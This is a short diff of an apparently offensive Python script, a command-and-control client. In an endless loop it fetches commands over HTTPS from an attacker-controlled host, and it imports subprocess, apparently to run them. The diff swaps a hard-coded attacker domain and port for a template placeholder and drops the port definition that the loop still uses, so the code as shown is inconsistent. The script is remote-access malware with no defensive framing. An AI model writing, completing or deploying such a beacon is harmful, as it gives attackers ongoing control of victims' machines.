@@ -1,10 +1,10 @@
 import requests
 import subprocess
 import time
+import os
 import urllib.parse
 
-ATTACKER_IP = 'chat.fjh1997.top' # change this to the attacker's IP address
-ATTACKER_PORT = 443
+ATTACKER_IP = {{DOMAIN_NAME}} 
 
 while True:
     command = requests.get(f"https://{ATTACKER_IP}:{ATTACKER_PORT}/get").text
